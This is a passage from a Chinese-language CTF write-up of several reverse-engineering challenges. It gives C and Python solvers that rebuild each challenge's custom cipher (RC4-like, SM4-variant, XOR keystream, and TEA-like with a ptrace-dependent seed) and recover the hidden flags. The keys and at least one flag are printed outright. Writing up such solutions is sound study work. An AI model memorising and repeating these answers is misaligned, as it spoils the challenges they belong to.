        v7[i] = n - 1 - i; // 80, 79, ..., 0
    }

    // KSA步骤
    unsigned char v16 = 0;
    for (int j = 0; j < n; j++) {
        v16 = (v16 + v7[j] + (unsigned char)key[j % key_len]) % n;
        unsigned char temp = v7[j];
        v7[j] = v7[v16];
        v7[v16] = temp;
    }

    // PRGA步骤用于加密
    int v14 = 0;
    int v13 = 0;
    for (int k = 0; k < data_len; k++) {
        v14 = (v13 ^ v14) % n;
        v13 = (v13 + v7[v14]) % n;
        unsigned char temp = v7[v14];
        v7[v14] = v7[v13];
        v7[v13] = temp;
        unsigned char stream_byte = v7[(v7[v14] ^ v7[v13]) % n];
        // 加密：加密索引 = (原始索引 + stream_byte) % n
        data[k] = (data[k] + stream_byte) % n;
    }

    free(v7);
}

// 解密函数
void decrypt(const char* key, char* data, int data_len) {
    int key_len = strlen(key);
    int n = strlen(Str); // n=81

    // 初始化v7数组
    unsigned char* v7 = (unsigned char*)malloc(n);
    for (int i = 0; i < n; i++) {
        v7[i] = n - 1 - i; // 80, 79, ..., 0
    }

    // KSA步骤
    unsigned char v16 = 0;
    for (int j = 0; j < n; j++) {
        v16 = (v16 + v7[j] + (unsigned char)key[j % key_len]) % n;
        unsigned char temp = v7[j];
        v7[j] = v7[v16];
        v7[v16] = temp;
    }

    // PRGA步骤用于解密
    int v14 = 0;
    int v13 = 0;
    for (int k = 0; k < data_len; k++) {
        v14 = (v13 ^ v14) % n;
        v13 = (v13 + v7[v14]) % n;
        unsigned char temp = v7[v14];
        v7[v14] = v7[v13];
        v7[v13] = temp;
        unsigned char stream_byte = v7[(v7[v14] ^ v7[v13]) % n];
        // 解密：原始索引 = (当前索引 - stream_byte + n) % n
        data[k] = (data[k] - stream_byte + n) % n;
    }

    free(v7);
}

int main() {
    char original_enc[] = ".sBtQ=0JEhC#sbw=Q-Y*3h-PGpcvZ9SbU+9F5tH96e>-5hMF";
    int data_len = strlen(original_enc);

    // 生成密钥
    char* key = KeyGen();
    printf("Generated Key: %s\n", key);

    // 分配内存并复制加密字符串
    char* data = (char*)malloc(data_len + 1);
    if (data == NULL) {
        printf("Memory allocation failed!\n");
        free(key);
        return 1;
    }

    memcpy(data, original_enc, data_len);
    data[data_len] = '\0';

    printf("Original encrypted: %s\n", data);

    // 将加密字符串转换为索引
    string_to_index(data);

    // 解密
    decrypt(key, data, data_len);

    // 将解密后的索引转换回字符串
    index_to_string(data, data_len);
    data[data_len] = '\0';

    printf("Decrypted Flag: %s\n", data);

    // 验证：重新加密解密后的内容，看是否与原始密文匹配
    printf("\n=== Verification ===\n");

    // 将解密后的字符串再次转换为索引
    string_to_index(data);

    // 重新加密
    encrypt(key, data, data_len);

    // 将加密后的索引转换回字符串
    index_to_string(data, data_len);
    data[data_len] = '\0';

    printf("Re-encrypted result: %s\n", data);
    printf("Original encrypted:  %s\n", original_enc);

    if (strcmp(data, original_enc) == 0) {
        printf("✓ Verification SUCCESS: Re-encrypted matches original!\n");
    }
    else {
        printf("✗ Verification FAILED: Re-encrypted does NOT match original!\n");
    }

    free(key);
    free(data);
    return 0;
}
```

##### 从这里开始推翻上面的几乎所有内容（喜欢吗

动态调试找到了真的key写解密代码（ps：为什么开始不动态，因为程序打不开，为什么程序打不开，因为没下载mingw，为什么下载mingw，因为网上有人和我一样hh）

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char* Str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&*+-.<=>?@_{|}~";

// 将字符串转换为索引数组（原地修改）
void string_to_index(char* str) {
    int len = strlen(str);
    int str_len = strlen(Str);
    for (int i = 0; i < len; i++) {
        int found = 0;
        for (int j = 0; j < str_len; j++) {
            if (str[i] == Str[j]) {
                str[i] = j; // 替换为索引值
                found = 1;
                break;
            }
        }
        if (!found) {
            printf("Invalid character in string!\n");
            exit(1);
        }
    }
}

// 将索引数组转换为字符串（原地修改）
void index_to_string(char* str, int len) {
    for (int i = 0; i < len; i++) {
        str[i] = Str[(unsigned char)str[i]];
    }
}

// 生成密钥（与加密代码相同）
char* KeyGen() {
    srand(0x11451419);
    int v2;
    do {
        v2 = rand() % 81;
    } while (v2 <= 11 || v2 > 16);
    char* v1 = (char*)malloc(v2 + 1);
    for (int i = 0; i < v2; i++) {
        v1[i] = Str[rand() % 81];
    }
    v1[v2] = 0;
    return v1;
}

// 加密函数（与原始加密代码相同）
void encrypt(const char* key, char* data, int data_len) {
    int key_len = strlen(key);
    int n = strlen(Str); // n=81

    // 初始化v7数组
    unsigned char* v7 = (unsigned char*)malloc(n);
    for (int i = 0; i < n; i++) {
        v7[i] = n - 1 - i; // 80, 79, ..., 0
    }

    // KSA步骤
    unsigned char v16 = 0;
    for (int j = 0; j < n; j++) {
        v16 = (v16 + v7[j] + (unsigned char)key[j % key_len]) % n;
        unsigned char temp = v7[j];
        v7[j] = v7[v16];
        v7[v16] = temp;
    }

    // PRGA步骤用于加密
    int v14 = 0;
    int v13 = 0;
    for (int k = 0; k < data_len; k++) {
        v14 = (v13 ^ v14) % n;
        v13 = (v13 + v7[v14]) % n;
        unsigned char temp = v7[v14];
        v7[v14] = v7[v13];
        v7[v13] = temp;
        unsigned char stream_byte = v7[(v7[v14] ^ v7[v13]) % n];
        // 加密：加密索引 = (原始索引 + stream_byte) % n
        data[k] = (data[k] + stream_byte) % n;
    }

    free(v7);
}

// 解密函数
void decrypt(const char* key, char* data, int data_len) {
    int key_len = strlen(key);
    int n = strlen(Str); // n=81

    // 初始化v7数组
    unsigned char* v7 = (unsigned char*)malloc(n);
    for (int i = 0; i < n; i++) {
        v7[i] = n - 1 - i; // 80, 79, ..., 0
    }

    // KSA步骤
    unsigned char v16 = 0;
    for (int j = 0; j < n; j++) {
        v16 = (v16 + v7[j] + (unsigned char)key[j % key_len]) % n;
        unsigned char temp = v7[j];
        v7[j] = v7[v16];
        v7[v16] = temp;
    }

    // PRGA步骤用于解密
    int v14 = 0;
    int v13 = 0;
    for (int k = 0; k < data_len; k++) {
        v14 = (v13 ^ v14) % n;
        v13 = (v13 + v7[v14]) % n;
        unsigned char temp = v7[v14];
        v7[v14] = v7[v13];
        v7[v13] = temp;
        unsigned char stream_byte = v7[(v7[v14] ^ v7[v13]) % n];
        // 解密：原始索引 = (当前索引 - stream_byte + n) % n
        data[k] = (data[k] - stream_byte + n) % n;
    }

    free(v7);
}

int main() {
    char original_enc[] = ".sBtQ=0JEhC#sbw=Q-Y*3h-PGpcvZ9SbU+9F5tH96e>-5hMF";
    int data_len = strlen(original_enc);

    // 生成密钥
    //char* key = KeyGen();
    char key[30] = "ep>nqEIqMA?3H%z";
    printf("Generated Key: %s\n", key);
    
    // 分配内存并复制加密字符串
    char* data = (char*)malloc(data_len + 1);

    if (data == NULL) {
        printf("Memory allocation failed!\n");
        free(key);
        return 1;
    }

    memcpy(data, original_enc, data_len);
    data[data_len] = '\0';

    printf("Original encrypted: %s\n", data);

    // 将加密字符串转换为索引
    string_to_index(data);

    // 解密
    decrypt(key, data, data_len);

    // 将解密后的索引转换回字符串
    index_to_string(data, data_len);
    data[data_len] = '\0';

    printf("Decrypted Flag: %s\n", data);

    // 验证：重新加密解密后的内容，看是否与原始密文匹配
    printf("\n=== Verification ===\n");

    // 将解密后的字符串再次转换为索引
    string_to_index(data);

    // 重新加密
    encrypt(key, data, data_len);

    // 将加密后的索引转换回字符串
    index_to_string(data, data_len);
    data[data_len] = '\0';

    printf("Re-encrypted result: %s\n", data);
    printf("Original encrypted:  %s\n", original_enc);

    if (strcmp(data, original_enc) == 0) {
        printf("✓ Verification SUCCESS: Re-encrypted matches original!\n");
    }
    else {
        printf("✗ Verification FAILED: Re-encrypted does NOT match original!\n");
    }

    free(key);
    free(data);
    return 0;
}
```

代码里的一堆废话请忽略，拿到真的key直接换了（

# 



## [re] changemykey

用了ida的宏，这题学到很多啊，用ida的宏，读数据的方式，还有一颗厌弃ai的心（之前ai都能干掉）

额我觉得还是说多一点吧，毕竟这题耗的时间长

首先这题是给了调试的可能的，因为有很多输出，所以开始发现不对就开调了，开始是想用python模拟，基本是对的但是不会传数据。。，后面出题人大大建议我用C并且推荐了ida的宏（这个真的香啊）然后剩下的就是读数据的问题了

为什么卡了这么久，我觉得很大部分原因都是对ai太依赖了，问ai的时间我估摸着10个小时是有的。。，因为这题干了两天多（别笑话我qwq

关于难度：还是感觉不算简单吧。。可能是我基础太差了呜呜(用ai用的)

```
#include <stdint.h>
#include <bits/stdc++.h>
#include "dfs.h"
using namespace std;
#define SAR(x, n) (((x >> (32 - n))) | (x << n))
const uint8_t S[256] = {
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
};

// CK数组定义
const uint32_t CK[32] = {
    0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,
    0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,
    0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,
    0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,
    0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,
    0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,
    0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,
    0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279
};

const uint32_t FK[4] = { 0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc };

int extendSecond(unsigned int *a1, unsigned int *a2) {
    int i; // r6
    unsigned int v4; // r0
    unsigned int v5; // r11
    __int64 v6; // r4
    int result; // r0
    unsigned int v9; // [sp+1Ch] [bp-24h]

    for (i = 0; i != 32; ++i)
    {
        v4 = a2[(i + 1) & 3] ^ a2[((_BYTE)i + 2) & 3] ^ a2[((_BYTE)i - 1) & 3] ^ CK[i];
        v5 = (S[BYTE2(v4)] << 16) | (S[HIBYTE(v4)] << 24);
        LODWORD(v6) = v5 | (S[BYTE1(v4)] << 8);
        HIDWORD(v6) = v6 + S[(unsigned __int8)v4];
        v9 = a2[i & 3];
        printf("b: %x\n", HIDWORD(v6));
        HIDWORD(v6) ^= ((HIDWORD(v6) << 13) | (v5 >> 19)) ^ (v6 >> 9);
        printf("L2: %x\n", HIDWORD(v6));
        result = v9 ^ HIDWORD(v6);
        a2[i & 3] = v9 ^ HIDWORD(v6);
        a1[i] = v9 ^ HIDWORD(v6);
    }
    return result;
}
void __fastcall iterate32(unsigned int* a1, unsigned int* a2)
{
    
    for (int i = 0; i != 32; ++i)
    {
        unsigned __int64 v4=0; // x8
        unsigned int v5=0; // w19
        int v6=0; // w21
        int v7=0; // w23
        int v8=0; // w22
        __int64 v9=0; // w9
        __int64 v10=0; // t2
        int v11=0; // w25
        __int64 result=0; // x0
        int v13=0; // w9
        unsigned int v15=0; // [xsp+Ch] [xbp-4h]


        v15 = a1[i & 3];
        v4 = a1[((_BYTE)i + 2) & 3] ^ a1[((_DWORD)i + 1) & 3] ^ a1[((_BYTE)i - 1) & 3] ^ a2[i];
     
        v5 = S[LOBYTE(v4)]; //等效BYTE0
        v6 = S[BYTE3(v4)] << 24;
        v7 = v6 | (S[BYTE2(v4)] << 16);
        v8 = v7 | (S[BYTE1(v4)] << 8);  
   
        HIDWORD(v10) = v8 | v5;//HIDWORD是v4的4个字节用S盒替换后和回来的东西
        LODWORD(v10) = v8;

        printf("b: %x\n", v8 | v5);
        v13 = i & 3;
        int b = (S[(v4 >> 24) & 0xFF] << 24) | (S[(v4 >> 16) & 0xFF] << 16) |
            (S[(v4 >> 8) & 0xFF] << 8) | S[v4 & 0xFF];
        a1[v13] = b ^ v15 ^ (__PAIR64__(v5, v8) >> 8) ^ (__PAIR64__(v8 | v5, v6) >> 30) ^ (__PAIR64__(v8 | v5, v7) >> 22) ^ (__PAIR64__(v8 | v5, v8) >> 14);
    }
}
void decrypt(unsigned int* a1, unsigned int* a2) {
    for (int i = 0; i < 4; i++)
    {
        printf("cipher:%x\n", a1[i]);
    }
    uint32_t reversed_keys[32];

    for (int i = 0; i < 32; ++i) {
        reversed_keys[i] = a2[31 - i];
    }
    iterate32(a1, reversed_keys);
    for (int i = 0; i < 4; i++)
    {
        printf("result:%x\n", a1[i]);
    }
}
int main() {
    uint32_t round_keys[32];
    uint32_t working_key[4];

    working_key[0] = 0x000000001;
    working_key[1] = 0x000000001;
    working_key[2] = 0x000000004;
    working_key[3] = 0x000000005;
    unsigned char mk[16] = "flag";   //注意这里是如何把字符串转成能用的十六进制的
    for (int i = 0; i <= 3; ++i)
        working_key[i] = working_key[i] ^ FK[i];
    
    uint32_t ciphertext[4] = {0xB60DE9B3, 0x7A7A7B4C, 0xC7D03789, 0x2A278E6C };
    extendSecond(round_keys, working_key);
    printf("-----------------------------------------\n");
    iterate32((unsigned int*)mk, round_keys); //直接强转
    decrypt(ciphertext, round_keys);
    return 0;
}
```

16进制找cyberchef解就行了



## [re] changemykey-rev

其实和上一题区别不大，就少用了一个i+2，一样是复制粘贴改一下就好了（这题伪代码真比上一题舒服吧

关键在这里

```
a1[(i + 4) % 4] = functionT(a2[i] ^ a1[(i + 3) % 4] ^ a1[(i + 1) % 4], 1) ^ v3;
```

少了i+2，所以解密时要改一下操作

flag{in1t_Rev__}

```
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include "dfs.h"
uint8_t S[256] = {
    0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05,
    0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99,
    0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62,
    0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6,
    0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8,
    0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35,
    0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87,
    0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e,
    0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1,
    0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3,
    0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f,
    0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51,
    0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8,
    0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0,
    0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84,
    0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48
};
uint32_t FK[4] = {
    0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc
};
uint32_t CK[32] = {
    0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269,
    0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9,
    0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249,
    0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9,
    0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229,
    0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299,
    0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209,
    0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279
};
__int64 __fastcall loopLeft(int a1, char a2)
{
    return (unsigned int)__ROL4__(a1, a2);
}
__int64 __fastcall functionB(int a1)
{
    return S[(unsigned __int8)a1] | (S[BYTE1(a1)] << 8) | (S[BYTE2(a1)] << 16) | (S[HIBYTE(a1)] << 24);
}
__int64 __fastcall functionL1(unsigned int a1)
{
    int v2; // [rsp+10h] [rbp-10h]
    int v3; // [rsp+14h] [rbp-Ch]
    int v4; // [rsp+18h] [rbp-8h]

    v2 = loopLeft(a1, 2) ^ a1;
    v3 = loopLeft(a1, 10) ^ v2;
    v4 = loopLeft(a1, 18) ^ v3;
    return (unsigned int)loopLeft(a1, 24) ^ v4;
}
__int64 __fastcall functionL2(unsigned int a1)
{
    int v2; // [rsp+8h] [rbp-8h]

    v2 = loopLeft(a1, 13) ^ a1;
    return (unsigned int)loopLeft(a1, 23) ^ v2;
}
__int64 __fastcall functionT(unsigned int a1, __int16 a2)
{
    unsigned int v4; // [rsp+10h] [rbp-10h]
    unsigned int v5; // [rsp+14h] [rbp-Ch]

    v5 = functionB(a1);
    v4 = functionL2(v5);
    if (a2 == 1)
        return (unsigned int)functionL1(v5);
    else
        return v4;
}
void extendFirst(const uint32_t MK[4], uint32_t K[4]) {
    for (int i = 0; i < 4; ++i)
        K[i] = FK[i] ^ MK[i];
}
void extendSecond(uint32_t rk[32], uint32_t K[4]) {
    for (int i = 0; i < 32; ++i) {
        uint32_t temp = CK[i] ^ K[(i + 1) % 4] ^ K[(i + 2) % 4] ^ K[(i + 3) % 4];
        temp = functionT(temp, 2);
        K[(i + 4) % 4] = temp ^ K[i % 4];
        rk[i] = K[(i + 4) % 4];
    }
}
void getRK(const uint32_t MK[4], uint32_t rk[32]) {
    uint32_t K[4];
    extendFirst(MK, K);
    extendSecond(rk, K);
}
void decrypt_iterate32(uint32_t state[4], const uint32_t rk[32]) {
    for (int i = 31; i >= 0; --i) {
        // 由于加密: a1[(i + 4) % 4] = functionT(a2[i] ^ a1[(i + 3) % 4] ^ a1[(i + 1) % 4], 1) ^ a1[i % 4];
        // 异或可逆
        // 解密: a1[i % 4] = a1[(i + 4) % 4] ^ functionT(a2[i] ^ a1[(i + 3) % 4] ^ a1[(i + 1) % 4], 1);
        state[i % 4] = state[(i + 4) % 4] ^ functionT(rk[i] ^ state[(i + 1) % 4] ^ state[(i + 3) % 4], 1);
    }
}
void reverse(const uint32_t input[4], uint32_t output[4]) {
    for (int i = 0; i < 4; ++i) {
        output[i] = input[3 - i];
    }
}
void decryptSM4(uint32_t ciphertext[4], const uint32_t rk[32], uint32_t plaintext[4]) {
    uint32_t state[4];
    reverse(ciphertext, state);
    decrypt_iterate32(state, rk);
    memcpy(plaintext, state, 4 * sizeof(uint32_t));
}
int main() {

    uint32_t ciphertext[4] = { 0x9F36CEF2, 0x67F0A53C, 0x29465F7C, 0x2486FCD9 };
    uint32_t MK[4];
    //0721->0D00 是什么呢，好难猜 Ciallo～(∠・ω< )⌒★
    MK[0] = 0x00000000;
    MK[1] = 0x0000000D;
    MK[2] = 0x00000000;
    MK[3] = 0x00000000;
    uint32_t round_keys[32];
    uint32_t working_key[4];
    working_key[0] = 0x00000000;
    working_key[1] = 0x0000000D;
    working_key[2] = 0x00000000;
    working_key[3] = 0x00000000;
    getRK(working_key, round_keys);
    uint32_t plaintext[4];
    decryptSM4(ciphertext, round_keys, plaintext);
    printf("解密结果 (十六进制):\n");
    for (int i = 0; i < 4; i++)
        printf("0x%08X ", plaintext[i]);
    return 0;
}
```

## EZrust

参考了去年的wp，先动态调试看，随便输入发现这里就跳出去了

```
if ( v3 != 40 )
```

大概能知道是strlen一样的东西，后面往下面看到了比较部分猜测是长度40，然后这里就过了

开始看下面以为是那个chacha20（特征），但是网上找在线解密解不出来感觉思路不太对（总不能ezrust还要我分析魔改吧）

然后就自然去动态调试找密钥了，然后就好了

```
#include <stdio.h>
#include <stdint.h>

int main() {
    // 从调试中得到的密钥流
    uint8_t keystream[40] = {
        0xC5, 0x0E, 0x39, 0xBC, 0x30, 0xF0, 0x1A, 0x9D,
        0x7F, 0x85, 0xEC, 0x27, 0x6A, 0xBD, 0x0B, 0x18,
        0xA2, 0xED, 0xFB, 0x71, 0x54, 0x6C, 0x32, 0x4F,
        0x23, 0x7F, 0x42, 0x83, 0xF9, 0xF2, 0xCF, 0x53,
        0xAC, 0x90, 0x0E, 0x95, 0xF0, 0x2A, 0xE9, 0x30
    };

    // 密文
    uint8_t ciphertext[40] = {
        0xA3, 0x62, 0x58, 0xDB, 0x4B, 0x82, 0x4F, 0xCE,
        0x48, 0xDA, 0xBE, 0x42, 0x1C, 0xD8, 0x59, 0x6B,
        0xC7, 0xB2, 0xCA, 0x02, 0x0B, 0x21, 0x6B, 0x10,
        0x4D, 0x4E, 0x7B, 0xEB, 0xCE, 0x9F, 0xFB, 0x21,
        0xE9, 0xCF, 0x6B, 0xC2, 0xC2, 0x4C, 0xB3, 0x4D
    };

    // 解密
    uint8_t flag[41] = { 0 };
    for (int i = 0; i < 40; i++) {
        flag[i] = keystream[i] ^ ciphertext[i];
    }

    printf("Flag: %s\n", flag);
    return 0;
}
```

读rust真痛苦（



## Dancing Keys

这题难点应该就是找种子吧，原程序主要就一个rand，看到rand想到生成随机数的函数，但是没找到，交叉引用找到生成种子的地方，然后找**教我怎么找种子就可以了，出题人的小巧思被不小心忽略了（

```
#!/usr/bin/env python3
import os


def sub_40128A(file_path, start_vaddr, a2):
    """
    模拟 sub_40128A 函数的功能
    """
    v3 = 0
    v4 = 0

    # 检查文件是否存在
    if not os.path.exists(file_path):
        print(f"错误: 文件 {file_path} 不存在")
        return 0

    # 获取文件大小
    file_size = os.path.getsize(file_path)

    # 简化方法：直接尝试从start地址对应的文件偏移读取
    # 对于典型的Linux ELF文件，代码段通常在文件偏移0x1000处，虚拟地址0x401000
    # 所以 0x401130 对应的文件偏移大约是 0x1130
    file_offset = 0x1130

    if file_offset >= file_size:
        print(f"错误: 文件偏移 0x{file_offset:x} 超出文件大小 {file_size}")
        return 0

    # 计算实际能读取的字节数
    actual_a2 = min(a2, file_size - file_offset)

    print(f"从文件偏移 0x{file_offset:x} 读取 {actual_a2} 字节")

    try:
        with open(file_path, 'rb') as f:
            f.seek(file_offset)
            data = f.read(actual_a2)
    except Exception as e:
        print(f"读取文件时出错: {e}")
        return 0

    # 计算 v3 和 v4，使用32位整数模拟
    for i in range(len(data)):
        byte_val = data[i]
        # 模拟32位整数加法（有符号）
        v3 = (v3 + i * byte_val) & 0xFFFFFFFF
        v4 = (v4 ^ byte_val) & 0xFFFFFFFF

    print(f"计算中间值:")
    print(f"  v3 = {v3} (0x{v3:08x})")
    print(f"  v4 = {v4} (0x{v4:08x})")

    # 模拟 ptrace(PTRACE_TRACEME, 0, 0, 0) 返回 0
    ptrace_result = 0

    # 计算最终结果，注意乘法可能溢出
    temp = (v4 ^ ptrace_result) & 0xFFFFFFFF
    result = (v3 * temp) & 0xFFFFFFFF

    # 转换为32位有符号整数
    if result > 0x7FFFFFFF:
        result = result - 0x100000000

    return result


def main():
    # 计算参数
    start_addr = 0x401130
    a2 = 4200941 - start_addr

    print(f"计算参数:")
    print(f"  start_addr: 0x{start_addr:x}")
    print(f"  a2: {a2} (0x{a2:x})")
    print()

    # 计算初始值
    result = sub_40128A('key', start_addr, a2)

    print()
    print(f"计算结果:")
    print(f"  dword_404060 初始值: {result}")
    print(f"  十六进制: 0x{result & 0xFFFFFFFF:08x}")

    # 额外信息：如果程序被调试(ptrace返回-1)会怎样
    print()
    print("注意: 以上结果假设程序没有被调试(ptrace返回0)")
    print("如果程序被调试(ptrace返回-1)，结果将是:")

    # 重新计算ptrace返回-1的情况
    v3 = 0
    v4 = 0
    file_offset = 0x1130
    actual_a2 = min(a2, os.path.getsize('key') - file_offset)

    with open('key', 'rb') as f:
        f.seek(file_offset)
        data = f.read(actual_a2)

    for i in range(len(data)):
        byte_val = data[i]
        v3 = (v3 + i * byte_val) & 0xFFFFFFFF
        v4 = (v4 ^ byte_val) & 0xFFFFFFFF

    ptrace_result = -1  # 被调试时ptrace返回-1
    temp = (v4 ^ ptrace_result) & 0xFFFFFFFF
    debug_result = (v3 * temp) & 0xFFFFFFFF
    if debug_result > 0x7FFFFFFF:
        debug_result = debug_result - 0x100000000

    print(f"  被调试时的值: {debug_result} (0x{debug_result & 0xFFFFFFFF:08x})")

    return result


if __name__ == "__main__":
    main()
```



```
#include <stdio.h>
#include <string.h>

unsigned int seed = 0x52a7ca10;

unsigned int my_rand() {
    seed ^= seed << 11;
    seed ^= seed >> 4;
    seed ^= seed * 32;
    seed ^= seed >> 14;
    return seed;
}

void decrypt_pair(unsigned int* v3, unsigned int* v4, unsigned int* key, unsigned int v7) {
    unsigned int v3_val = *v3;
    unsigned int v4_val = *v4;
    for (int i = 113; i >= 0; i--) {
        unsigned int v5 = -559038737 + v7 * (i * (i + 1) / 2);
        unsigned int G = (v3_val - v5) ^ key[1] ^ (v3_val << ((i + 2) % 6)) ^ (v3_val >> ((i + 3) % 7)) ^ key[3];
        v4_val = v4_val - G;
        unsigned int F = (v4_val - v5) ^ key[2] ^ (v4_val << ((i + 1) % 5)) ^ (v4_val >> ((i + 4) & 7)) ^ key[0];
        v3_val = v3_val - F;
    }
    *v3 = v3_val;
    *v4 = v4_val;
}

int main() {
    unsigned char cipher[48] = {
        0x6E, 0xAA, 0xB2, 0x46, 0x14, 0xA4, 0x7E, 0x60, 0xBA, 0x44, 0x4E, 0xCC,
        0x43, 0xAA, 0xAA, 0xCD, 0xD4, 0xFC, 0x71, 0xAA, 0xF6, 0x7D, 0x4B, 0x9B,
        0xE6, 0x7D, 0xEF, 0x4E, 0x3D, 0x43, 0x0B, 0xBF, 0x28, 0x14, 0x85, 0xB2,
        0xCF, 0x62, 0xA2, 0xC5, 0xEA, 0x7D, 0xEB, 0x5E, 0xD6, 0xFC, 0x3C, 0xBF
    };

    unsigned int enc[12];
    for (int i = 0; i < 12; i++) {
